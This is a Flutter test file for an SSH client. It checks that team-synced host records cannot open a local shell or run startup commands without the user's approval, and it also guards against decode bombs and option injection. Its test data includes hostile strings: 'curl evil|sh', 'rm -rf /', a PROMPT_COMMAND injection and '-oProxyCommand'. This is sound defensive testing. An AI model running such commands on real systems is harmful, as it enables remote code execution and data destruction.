import 'dart:async';
import 'dart:convert';

import 'package:drift/drift.dart' hide isNull, isNotNull;
import 'package:drift/native.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:zestssh/core/errors/error_codes.dart';
import 'package:zestssh/core/models/host_icon_limits.dart';
import 'package:zestssh/core/widgets/os_icon.dart';
import 'package:zestssh/database/database.dart';
import 'package:zestssh/features/orchards/sync/item_store.dart';
import 'package:zestssh/features/orchards/team_host_commands.dart';
import 'package:zestssh/features/orchards/widgets/team_host_commands_question.dart';
import 'package:zestssh/l10n/generated/app_localizations.dart';
import 'package:zestssh/providers/core_providers.dart';
import 'package:zestssh/providers/purchase_providers.dart';
import 'package:zestssh/providers/security_providers.dart';
import 'package:zestssh/providers/settings_providers.dart';
import 'package:zestssh/providers/terminal_providers.dart';
import 'package:zestssh/services/mosh_service.dart';
import 'package:zestssh/services/ssh_service.dart';

import '../sharing/share_fakes.dart' show until;
import '../../helpers/orchard_db_fixture.dart';

/// A teammate's host record ran a command on another member's own computer,
/// with no question (found in a security review): a host saved as a local
/// shell, with a start-up command, travelled in a record as any other, and
/// opening it (or a tab restored with no click) started a shell here and typed
/// the command into it. A team's host never opens a shell here now, and what any
/// team's host types as it connects is its person's to allow, text by text.
class _Pro extends StateNotifier<bool> implements ProStatusNotifier {
  _Pro() : super(true);
  @override
  dynamic noSuchMethod(Invocation invocation) => super.noSuchMethod(invocation);
}

class _Lock extends StateNotifier<bool> implements AppLockNotifier {
  _Lock() : super(false);
  @override
  dynamic noSuchMethod(Invocation invocation) => super.noSuchMethod(invocation);
}

class _Shell extends ShellService {
  _Shell({this.exitedCleanly = true});

  final written = <int>[];
  final _out = StreamController<Uint8List>.broadcast();
  final _state = StreamController<bool>.broadcast();

  String get typed => utf8.decode(written);

  @override
  Future<void> connect() async {}
  @override
  Future<void> disconnect() async {}
  @override
  late final Stream<Uint8List> stdout = _out.stream;
  @override
  Stream<Uint8List> get stderr => const Stream.empty();
  @override
  void write(Uint8List data) => written.addAll(data);
  @override
  void resize(int width, int height) {}
  @override
  bool get isConnected => true;
  @override
  late final Stream<bool> connectionState = _state.stream;
  @override
  final bool exitedCleanly;
  @override
  bool get isEncryptedSsh => false;

  /// The connection drops.
  void drop() => _state.add(false);
}

Future<void> _applying(AppDatabase db, Future<void> Function() body) => db.transaction(() async {
      await db.customStatement('UPDATE orchard_sync_control SET applying = 1 WHERE id = 1');
      await body();
      await db.customStatement('UPDATE orchard_sync_control SET applying = 0 WHERE id = 1');
    });

Map<String, Object?> _hostRecord(String id, {String protocol = 'ssh', String? startup, Map<String, Object?> also = const {}}) {
  final at = DateTime.utc(2026, 10, 30).millisecondsSinceEpoch ~/ 1000;
  return {
    'connections': [
      {
        'id': id,
        'label': 'Prod DB',
        'host': 'db.acme.example',
        'port': 22,
        'protocol': protocol,
        'startup_command': ?startup,
        'created_at': at,
        ...also,
      },
    ],
  };
}

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();
  driftRuntimeOptions.dontWarnAboutMultipleDatabases = true;

  late ProviderContainer container;
  late AppDatabase team;

  /// The app's sessions over the database [db], with a stand-in for every shell.
  ProviderContainer over(AppDatabase db, SharedPreferences prefs) {
    final c = ProviderContainer(overrides: [
      sharedPreferencesProvider.overrideWithValue(prefs),
      isProProvider.overrideWith((ref) => _Pro()),
      isAppLockedProvider.overrideWith((ref) => _Lock()),
    ]);
    c.read(databaseSessionProvider.notifier).seed(db);
    return c;
  }

  setUp(() async {
    FlutterSecureStorage.setMockInitialValues({});
    SharedPreferences.setMockInitialValues(const {});
    team = AppDatabase.forTesting(NativeDatabase.memory(), isOrchard: true);
    await seedOrchardAsOwner(team);
    container = over(team, await SharedPreferences.getInstance());
  });

  tearDown(() async {
    container.dispose();
    await team.close();
  });

  /// [id] as a teammate's record brings it, and as this device reads it.
  Future<Connection> arrived(String id, {String? startup, Map<String, Object?> also = const {}}) async {
    await _applying(team, () => OrchardItemStore(team).write('host', id, data: _hostRecord(id, startup: startup, also: also), editedAt: 1761782400000));
    return (await team.connectionsDao.getById(id))!;
  }

  /// A row as it would stand had an older version taken it.
  Future<Connection> alreadyHere(String id, String protocol, {String? startup}) async {
    final at = DateTime.utc(2026, 10, 30);
    await team.into(team.connections).insert(ConnectionsCompanion.insert(
        id: id,
        label: 'Prod DB',
        host: 'db.acme.example',
        protocol: Value(protocol),
        startupCommand: Value(startup),
        createdAt: at,
        updatedAt: at));
    return (await team.connectionsDao.getById(id))!;
  }

  /// [sessions] opening hosts with [shell], the session state it reaches.
  ActiveSessionsNotifier withShell(_Shell shell) =>
      container.read(activeSessionsProvider.notifier)..debugShellFor = (_) => shell;

  Future<void> connected(String id) => until(
      () => container.read(activeSessionsProvider)[id]?.status == SessionStatus.connected,
      what: 'the session connected');

  /// Answers every question with [answer]; the questions asked.
  List<TeamCommandsRequest> answering(bool answer) {
    final asked = <TeamCommandsRequest>[];
    container.listen<TeamCommandsRequest?>(teamCommandsRequestProvider, (_, r) {
      if (r == null || !r.isOpen) return;
      asked.add(r);
      r.reply(answer);
    });
    return asked;
  }

  group('a record of a host', () {
    test('that opens a shell on this computer is refused, and nothing of it is written', () async {
      for (final protocol in ['localShell', 'localshell', 'LOCALSHELL', 'local']) {
        await expectLater(
          _applying(team, () => OrchardItemStore(team).write('host', 'h-$protocol',
              data: _hostRecord('h-$protocol', protocol: protocol, startup: 'echo RAN'), editedAt: 1761782400000)),
          throwsA(isA<RecordRefused>()),
          reason: protocol,
        );
        expect(await team.connectionsDao.getById('h-$protocol'), isNull);
      }
    });

    test('of a host already here: the refused version changes nothing', () async {
      await arrived('h1', startup: 'uptime');
      await expectLater(
        _applying(team, () => OrchardItemStore(team)
            .write('host', 'h1', data: _hostRecord('h1', protocol: 'localShell', startup: 'curl evil|sh'), editedAt: 1761782400001)),
        throwsA(isA<RecordRefused>()),
      );
      final kept = (await team.connectionsDao.getById('h1'))!;
      expect((kept.protocol, kept.startupCommand), ('ssh', 'uptime'));
    });

    test('what goes to an address stays: SSH, files only, Mosh, ET, Telnet, and Serial, SSH to a console server', () async {
      for (final protocol in ['ssh', 'sftp', 'mosh', 'et', 'telnet', 'serial']) {
        await _applying(team, () => OrchardItemStore(team)
            .write('host', 'h-$protocol', data: _hostRecord('h-$protocol', protocol: protocol), editedAt: 1761782400000));
        expect((await team.connectionsDao.getById('h-$protocol'))!.protocol, protocol);
      }
    });

    test('a picture over the cap is dropped and the host is kept; one under it stays', () async {
      final big = base64Encode(List<int>.filled(3 * 1024 * 1024, 7));
      final small = base64Encode(List<int>.filled(1024, 7));
      expect((await arrived('big', also: {'custom_icon': big})).customIcon, isNull);
      expect((await arrived('small', also: {'custom_icon': small})).customIcon, small);
    });

    test('a value not of its column\'s type, or a required one left out, is refused: it stopped every read of the hosts',
        () async {
      for (final bad in <Map<String, Object?>>[
        {'port': 'twenty-two'},
        {'label': 5},
        {'forward_agent': 'yes'},
        {'created_at': '2026-10-30'},
        {'label': null},
      ]) {
        await expectLater(
          _applying(team, () => OrchardItemStore(team)
              .write('host', 'bad', data: _hostRecord('bad', also: bad), editedAt: 1761782400000)),
          throwsFormatException,
          reason: '$bad',
        );
        expect(await team.connectionsDao.getAll(), isEmpty, reason: '$bad');
      }
      final noName = _hostRecord('bad');
      ((noName['connections'] as List).single as Map).remove('label');
      await expectLater(
        _applying(team, () => OrchardItemStore(team).write('host', 'bad', data: noName, editedAt: 1761782400000)),
        throwsFormatException,
      );
    });
  });

  group('the shell chosen for a team host', () {
    test('one that came anyway never starts: nothing is opened, nothing typed, and it says why with a code', () async {
      final host = await alreadyHere('old', 'localShell', startup: 'echo RAN-ON-THIS-COMPUTER');
      final shell = _Shell();
      var chosen = 0;
      final sessions = container.read(activeSessionsProvider.notifier)
        ..debugShellFor = (_) {
          chosen++;
          return shell;
        };
      final id = sessions.startSession(host)!;
      await until(() => container.read(activeSessionsProvider)[id]?.status == SessionStatus.error, what: 'the refusal');
      expect(chosen, 0, reason: 'refused before any shell is made');
      expect(shell.written, isEmpty);
      final said = container.read(connectionErrorProvider);
      expect(said!.errorMessage, contains('(${ErrorCodes.teamHostLocalShell.code})'));
      expect(said.errorMessage, contains(lookupAppLocalizations(const Locale('en')).teamHostLocalShellRefused));
    });

    test('Serial stays an SSH connection to its console server: only what opens a shell here is refused', () {
      expect(teamMayNotOpenWith('serial'), isFalse);
      expect(teamMayNotOpenWith('ssh'), isFalse);
      expect(teamMayNotOpenWith('localShell'), isTrue);
    });

    test("in the person's own space a local shell opens as ever", () async {
      SharedPreferences.setMockInitialValues(const {});
      final tree = AppDatabase.forTesting(NativeDatabase.memory());
      addTearDown(tree.close);
      final mine = over(tree, await SharedPreferences.getInstance());
      addTearDown(mine.dispose);
      final at = DateTime.utc(2026, 10, 30);
      await tree.into(tree.connections).insert(ConnectionsCompanion.insert(
          id: 'mine',
          label: 'Mine',
          host: 'localhost',
          protocol: const Value('localShell'),
          startupCommand: const Value('echo hello'),
          createdAt: at,
          updatedAt: at));
      final shell = _Shell();
      final sessions = mine.read(activeSessionsProvider.notifier)..debugShellFor = (_) => shell;
      final id = sessions.startSession((await tree.connectionsDao.getById('mine'))!)!;
      await until(() => shell.typed.contains('echo hello'), what: 'its own command');
      expect(mine.read(activeSessionsProvider)[id]?.status, SessionStatus.connected);
      expect(mine.read(teamCommandsRequestProvider), isNull, reason: 'its owner is not asked about their own');
    });
  });

  group('what a team host types as it connects', () {
    test('nothing is typed until yes, and the person is shown it exactly', () async {
      final host = await arrived('h1', startup: 'curl evil|sh${String.fromCharCode(0x202e)}');
      final shell = _Shell();
      final sessions = withShell(shell);
      final id = sessions.startSession(host)!;
      await connected(id);
      await until(() => container.read(teamCommandsRequestProvider) != null, what: 'the question');
      final asked = container.read(teamCommandsRequestProvider)!;
      expect(shell.written, isEmpty, reason: 'nothing before the answer');
      expect(asked.hostLabel, 'Prod DB');
      expect(asked.address, 'db.acme.example:22');
      expect(asked.commands.shown, ['curl evil|sh\\u202e'], reason: 'what hides or turns the text round is written as its code');
      asked.reply(true);
      await until(() => shell.typed.contains('curl evil|sh'), what: 'the command typed');
    });

    test('asked once for each exact text, again when it changes, and for no other host that way', () async {
      final asked = answering(true);
      final shell = _Shell();
      final sessions = withShell(shell);
      final host = await arrived('h1', startup: 'uptime');

      await connected(sessions.startSession(host)!);
      await until(() => shell.typed.contains('uptime'), what: 'typed after yes');
      expect(asked, hasLength(1));

      shell.written.clear();
      await connected(sessions.startSession(host, allowDuplicate: true)!);
      await until(() => shell.typed.contains('uptime'), what: 'typed with no question');
      expect(asked, hasLength(1), reason: 'the same text on the same host');

      shell.written.clear();
      final changed = await arrived('h1', startup: 'curl evil|sh');
      await connected(sessions.startSession(changed, allowDuplicate: true)!);
      await until(() => shell.typed.contains('curl evil|sh'), what: 'the new text, after its own yes');
      expect(asked, hasLength(2), reason: 'a changed text asks again');
      expect(asked.last.commands.startup, 'curl evil|sh');

      final other = await arrived('h2', startup: 'uptime');
      shell.written.clear();
      await connected(sessions.startSession(other)!);
      await until(() => shell.typed.contains('uptime'), what: 'the other host');
      expect(asked, hasLength(3), reason: 'the same text on another host asks');
    });

    test('a no leaves the session open, types nothing, says so, and is asked again next time', () async {
      final asked = answering(false);
      final shell = _Shell();
      final sessions = withShell(shell);
      final host = await arrived('h1', startup: 'uptime');
      final id = sessions.startSession(host)!;
      await connected(id);
      await until(() => asked.isNotEmpty, what: 'the question');
      await until(() => container.read(activeSessionsProvider)[id]!.connectionLog.any((l) => l.startsWith('team:')), what: 'said');
      expect(shell.written, isEmpty);
      expect(container.read(activeSessionsProvider)[id]!.status, SessionStatus.connected);

      await connected(sessions.startSession(host, allowDuplicate: true)!);
      await until(() => asked.length == 2, what: 'asked again');
      expect(shell.written, isEmpty);
    });

    test('its variables and its snippet are asked about with it, and what is typed is what was shown', () async {
      final at = DateTime.utc(2026, 10, 30);
      await _applying(team, () => OrchardItemStore(team).write('snippet', 's1',
          data: {
            'snippets': [
              {'id': 's1', 'label': 'Check', 'command': 'df -h', 'created_at': at.millisecondsSinceEpoch ~/ 1000},
            ],
          },
          editedAt: 1761782400000));
      final host = await arrived('h1', startup: 'uptime', also: {
        'snippet_id': 's1',
        'env_vars': jsonEncode({'PROMPT_COMMAND': 'curl evil|sh', 'not a name': 'x'}),
      });
      final shell = _Shell();
      final sessions = withShell(shell);
      await connected(sessions.startSession(host)!);
      await until(() => container.read(teamCommandsRequestProvider) != null, what: 'the question');
      final asked = container.read(teamCommandsRequestProvider)!;
      expect(asked.commands.shown, ["export PROMPT_COMMAND='curl evil|sh'", 'uptime', 'df -h']);

      // A teammate changes the snippet while the question is up: what was shown
      // is what is typed.
      await team.customStatement("UPDATE snippets SET command = 'rm -rf /' WHERE id = 's1'");
      asked.reply(true);
      await until(() => shell.typed.contains('df -h'), what: 'all of it typed');
      expect(shell.typed, contains('PROMPT_COMMAND'));
      expect(shell.typed, contains('uptime'));
      expect(shell.typed, isNot(contains('rm -rf')));
    });

    test('a session brought back with no click asks nothing and types nothing without a yes, and says so', () async {
      final asked = answering(true);
      final shell = _Shell();
      final sessions = withShell(shell);
      final host = await arrived('h1', startup: 'uptime');
      final id = sessions.startRestoredSession(host)!;
      await connected(id);
      await until(() => container.read(activeSessionsProvider)[id]!.connectionLog.any((l) => l.startsWith('team:')), what: 'said');
      expect(asked, isEmpty);
      expect(shell.written, isEmpty);
      final said = lookupAppLocalizations(const Locale('en')).teamCommandsNotRunNobody;
      expect(container.read(activeSessionsProvider)[id]!.connectionLog.last, 'team: $said');

      // Once allowed, one brought back runs it: it was seen and said yes to.
      await connected(sessions.startSession(host, allowDuplicate: true)!);
      await until(() => shell.typed.contains('uptime'), what: 'after a yes');
      shell.written.clear();
      await connected(sessions.startRestoredSession(host)!);
      await until(() => shell.typed.contains('uptime'), what: 'restored, allowed before');
    });

    group('a session connected again', () {
      late List<_Shell> shells;
      late ActiveSessionsNotifier sessions;

      setUp(() {
        ActiveSessionsNotifier.debugReconnectDelay = Duration.zero;
        addTearDown(() => ActiveSessionsNotifier.debugReconnectDelay = null);
        shells = [];
        sessions = container.read(activeSessionsProvider.notifier)
          ..debugShellFor = (_) {
            final shell = _Shell(exitedCleanly: false);
            shells.add(shell);
            return shell;
          };
      });

      test('by itself: asks nothing, types nothing without a yes, and says so', () async {
        final asked = answering(false);
        final id = sessions.startSession(await arrived('h1', startup: 'uptime'))!;
        await connected(id);
        await until(() => asked.length == 1, what: 'asked as it opened');
        shells.last.drop();
        await until(() => shells.length == 2, what: 'connected again');
        await connected(id);
        await until(() => container.read(activeSessionsProvider)[id]!.connectionLog.isNotEmpty, what: 'its log');
        await pumpEventQueue();
        expect(asked, hasLength(1), reason: 'nobody may be there');
        expect(shells.last.written, isEmpty);
        sessions.stopAutoReconnect(id);
      });

      test('by itself, with a yes from before: it is typed', () async {
        answering(true);
        final id = sessions.startSession(await arrived('h1', startup: 'uptime'))!;
        await connected(id);
        await until(() => shells.last.typed.contains('uptime'), what: 'typed after yes');
        shells.last.drop();
        await until(() => shells.length == 2, what: 'connected again');
        await until(() => shells.last.typed.contains('uptime'), what: 'typed again');
        sessions.stopAutoReconnect(id);
      });

      test('at its person\'s Reconnect: they are there, and are asked', () async {
        container.read(autoReconnectEnabledProvider.notifier).state = false;
        final asked = answering(false);
        final id = sessions.startSession(await arrived('h1', startup: 'uptime'))!;
        await connected(id);
        await until(() => asked.length == 1, what: 'asked as it opened');
        shells.last.drop();
        await until(() => container.read(activeSessionsProvider)[id]?.status == SessionStatus.disconnected, what: 'dropped');
        sessions.reconnectNow(id);
        await until(() => asked.length == 2, what: 'asked at Reconnect');
        expect(shells.last.written, isEmpty);
        sessions.stopAutoReconnect(id);
      });
    });

    test('a run with nobody there asks nothing and types nothing', () async {
      final asked = answering(true);
      final shell = _Shell();
      final sessions = withShell(shell);
      final host = await arrived('h1', startup: 'uptime');
      final id = sessions.startSession(host, unattended: true)!;
      await connected(id);
      await until(() => container.read(activeSessionsProvider)[id]!.connectionLog.any((l) => l.startsWith('team:')), what: 'said');
      expect(asked, isEmpty);
      expect(shell.written, isEmpty);
    });

    test('what is too long to read in a question is not run, and says so', () async {
      final asked = answering(true);
      final shell = _Shell();
      final sessions = withShell(shell);
      final host = await arrived('h1', startup: 'x' * (kMaxTeamCommandChars + 1));
      final id = sessions.startSession(host)!;
      await connected(id);
      await until(() => container.read(activeSessionsProvider)[id]!.connectionLog.any((l) => l.startsWith('team:')), what: 'said');
      expect(asked, isEmpty);
      expect(shell.written, isEmpty);
    });

    test('a host with nothing to type asks nothing', () async {
      final asked = answering(true);
      final shell = _Shell();
      final sessions = withShell(shell);
      await connected(sessions.startSession(await arrived('h1'))!);
      await pumpEventQueue();
      expect(asked, isEmpty);
      expect(shell.written, isEmpty);
    });
  });

  group('the question', () {
    testWidgets('shows the host and the command, and an Enter meant for the terminal answers nothing', (tester) async {
      final l10n = lookupAppLocalizations(const Locale('en'));
      final request = TeamCommandsRequest(
        hostLabel: 'Prod DB',
        address: 'db.acme.example',
        commands: const TeamConnectCommands(startup: 'uptime\n\n\ncurl evil|sh'),
      );
      await tester.pumpWidget(ProviderScope(
        child: MaterialApp(
          localizationsDelegates: AppLocalizations.localizationsDelegates,
          supportedLocales: AppLocalizations.supportedLocales,
          locale: const Locale('en'),
          home: Builder(
            builder: (context) => Scaffold(
              body: TextButton(
                onPressed: () async => request.reply(await showTeamCommandsQuestion(context, request) ?? false),
                child: const Text('open'),
              ),
            ),
          ),
        ),
      ));
      await tester.tap(find.text('open'));
      await tester.pumpAndSettle();
      expect(find.text(l10n.teamCommandsTitle), findsOneWidget);
      expect(find.text(l10n.teamCommandsBody('Prod DB', 'db.acme.example')), findsOneWidget);
      expect(tester.widget<SelectableText>(find.byKey(const ValueKey('team-commands-text'))).data, r'uptime\n\n\ncurl evil|sh',
          reason: 'line breaks cannot push what runs out of sight');

      await tester.sendKeyEvent(LogicalKeyboardKey.enter);
      await tester.pumpAndSettle();
      expect(request.isOpen, isTrue);

      await tester.tap(find.text(l10n.teamCommandsRun));
      await tester.pumpAndSettle();
      expect(await request.answer, isTrue);
    });

    /// The app's root, answering the sessions' questions; the provider container.
    Future<ProviderContainer> answering(WidgetTester tester) async {
      late ProviderContainer scope;
      final navigator = GlobalKey<NavigatorState>();
      final prefs = await SharedPreferences.getInstance();
      await tester.pumpWidget(ProviderScope(
        overrides: [
          sharedPreferencesProvider.overrideWithValue(prefs),
          isAppLockedProvider.overrideWith((ref) => _Lock()),
        ],
        child: MaterialApp(
          navigatorKey: navigator,
          localizationsDelegates: AppLocalizations.localizationsDelegates,
          supportedLocales: AppLocalizations.supportedLocales,
          locale: const Locale('en'),
          home: Consumer(builder: (context, ref, _) {
            scope = ProviderScope.containerOf(context, listen: false);
            answerTeamCommandRequests(ref, () => navigator.currentContext);
            return const Scaffold();
          }),
        ),
      ));
      return scope;
    }

    TeamCommandsRequest aQuestion() => TeamCommandsRequest(
          hostLabel: 'Prod DB',
          address: 'db.acme.example',
          commands: const TeamConnectCommands(startup: 'uptime'),
        );

    testWidgets('nobody answers in time: the question closes, where a Run left on screen would do nothing', (tester) async {
      final scope = await answering(tester);
      final answer = askTeamCommands(scope.read, aQuestion());
      await tester.pumpAndSettle();
      expect(find.byKey(const ValueKey('team-commands-box')), findsOneWidget);

      await tester.pump(kTeamCommandsRequestTimeout);
      await tester.pumpAndSettle();
      expect(find.byKey(const ValueKey('team-commands-box')), findsNothing);
      expect(await answer, isFalse, reason: 'the session then says it was not run');
      expect(scope.read(teamCommandsRequestProvider), isNull);
    });

    testWidgets('with a dialog opened over it, that dialog stays and the question goes from under it', (tester) async {
      final scope = await answering(tester);
      final answer = askTeamCommands(scope.read, aQuestion());
      await tester.pumpAndSettle();
      final context = tester.element(find.byKey(const ValueKey('team-commands-box')));
      unawaited(showDialog<void>(
          context: context,
          useRootNavigator: true,
          builder: (_) => const AlertDialog(key: ValueKey('over-it'), title: Text('over it'))));
      await tester.pumpAndSettle();

      await tester.pump(kTeamCommandsRequestTimeout);
      await tester.pumpAndSettle();
      expect(find.byKey(const ValueKey('team-commands-box')), findsNothing);
      expect(find.byKey(const ValueKey('over-it')), findsOneWidget);
      expect(await answer, isFalse);
    });

    testWidgets('answered in time, its own buttons close it, and the time that ran on changes nothing', (tester) async {
      final scope = await answering(tester);
      final answer = askTeamCommands(scope.read, aQuestion());
      await tester.pumpAndSettle();
      await tester.tap(find.text(lookupAppLocalizations(const Locale('en')).teamCommandsRun));
      await tester.pumpAndSettle();
      expect(await answer, isTrue);
      expect(find.byKey(const ValueKey('team-commands-box')), findsNothing);
      await tester.pump(kTeamCommandsRequestTimeout);
      await tester.pumpAndSettle();
      expect(await answer, isTrue);
    });
  });

  group('a host picture', () {
    /// A PNG's head saying it is [width] by [height].
    String png(int width, int height) {
      final head = ByteData(24);
      const start = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13, 0x49, 0x48, 0x44, 0x52];
      for (var i = 0; i < start.length; i++) {
        head.setUint8(i, start[i]);
      }
      head
        ..setUint32(16, width)
        ..setUint32(20, height);
      return base64Encode(head.buffer.asUint8List());
    }

    test('is drawn only as a PNG that says it is small', () {
      expect(hostIconBytes(png(128, 128)), isNotNull);
      expect(hostIconBytes(png(kMaxHostIconSide, kMaxHostIconSide)), isNotNull);
      expect(hostIconBytes(png(30000, 30000)), isNull, reason: 'a decode bomb');
      expect(hostIconBytes(png(0, 5)), isNull);
      expect(hostIconBytes(base64Encode(utf8.encode('GIF89a this is no png, and long enough'))), isNull);
      expect(hostIconBytes('not base64!'), isNull);
      expect(hostIconBytes('A' * (kMaxHostIconChars + 1)), isNull);
      expect(hostIconBytes(null), isNull);
      expect(hostIconBytes(''), isNull);
    });

    testWidgets('a bomb draws the built-in icon, and a good one is decoded no larger than drawn', (tester) async {
      await tester.pumpWidget(MaterialApp(home: HostIcon(customIcon: png(30000, 30000), size: 40)));
      expect(find.byType(Image), findsNothing);
      expect(find.byType(OsIcon), findsOneWidget);

      await tester.pumpWidget(MaterialApp(home: HostIcon(customIcon: png(64, 64), size: 40)));
      final image = tester.widget<Image>(find.byType(Image));
      expect((image.image as ResizeImage).width, 40 * 3, reason: 'the test window draws at 3 pixels to the point');
    });
  });

  test('Mosh takes no address or user name that reads as an option', () {
    expect(() => MoshService(host: '-oProxyCommand', username: 'me').windowsArguments(), throwsArgumentError);
    expect(() => MoshService(host: 'db.example.com', username: '--ssh').windowsArguments(), throwsArgumentError);
    expect(MoshService(host: 'db.example.com', username: 'me').windowsArguments(), contains('me@db.example.com'));
  });
}
